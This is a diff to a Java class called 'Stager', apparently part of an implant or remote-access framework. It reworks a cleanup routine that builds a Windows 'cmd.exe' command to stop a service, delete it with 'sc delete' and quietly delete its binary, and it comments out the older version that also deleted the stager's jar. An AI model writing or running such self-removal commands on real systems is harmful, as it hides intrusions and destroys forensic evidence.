@@ -202,20 +202,43 @@ public class Stager extends ClassLoader {
                         break;
                     }
                 }  
+                
+                if( theSvcPath != null ){                            
+                            
+                    //Stop the svc, Remove the reg entry, delete files
+                    cleanupList.add("cmd.exe");
+                    cleanupList.add("/c");
 
-                //Stop the svc, Remove the reg entry, delete files
-                cleanupList.add("cmd.exe");
-                cleanupList.add("/c");
+                    StringBuilder aSB = new StringBuilder();
+                    aSB.append("net stop \"").append(theSvcPath).append("\"");
+                    aSB.append(" && sc delete \"").append(theSvcPath).append("\"");
 
-                StringBuilder aSB = new StringBuilder();
-                aSB.append("net stop \"").append(serviceName).append("\"");
+                    //If this starts becoming unreliable, possibly move to
+                    //ManagementFactory.getRuntimeMXBean().getName();
+                    // to get pid, and then get the binary path using
+                    //wmic process get ProcessID,ExecutablePath | findstr <pid>
+                    aSB.append(" && del /q \"").append(theSvcPath).append("\"");
+                    cleanupList.add(aSB.toString());
+//                    try{
+//                        Runtime.getRuntime().exec(cleanupList.toArray( new String[cleanupList.size()]) );
+//                    } catch(IOException ex){            
+//                    }    
 
-                if(theSvcPath != null ){
-                    aSB.append(" && \"").append(theSvcPath).append("\" -u");
-                    aSB.append(" && del \"").append(theSvcPath).append("\"");
-                }
-                aSB.append(" && del \"").append( theJarFile.getAbsolutePath()).append("\"");                
-                cleanupList.add(aSB.toString());
+                } 
+
+//                //Stop the svc, Remove the reg entry, delete files
+//                cleanupList.add("cmd.exe");
+//                cleanupList.add("/c");
+//
+//                StringBuilder aSB = new StringBuilder();
+//                aSB.append("net stop \"").append(serviceName).append("\"");
+//
+//                if(theSvcPath != null ){
+//                    aSB.append(" && \"").append(theSvcPath).append("\" -u");
+//                    aSB.append(" && del \"").append(theSvcPath).append("\"");
+//                }
+//                aSB.append(" && del \"").append( theJarFile.getAbsolutePath()).append("\"");                
+//                cleanupList.add(aSB.toString());
                               
             } catch ( IOException ex ) {
                 ex = null;
